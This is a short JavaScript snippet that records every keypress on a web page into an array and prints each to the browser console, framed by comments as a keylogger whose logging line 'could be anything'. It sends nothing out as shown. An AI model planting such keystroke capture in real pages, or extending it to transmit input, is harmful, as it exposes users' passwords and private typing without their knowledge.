// with great power comes great responsibility... -spencer
var keys = [];
document.addEventListener("keydown", log);

function log(evt){
    if(evt.keyCode == 8){
        keys.push(evt.keyCode);
    }
    else{
        keys.push(String.fromCharCode(evt.keyCode));
    }
    console.log(keys[keys.length-1]); //just for viewing outputs' sake--this could be anything
}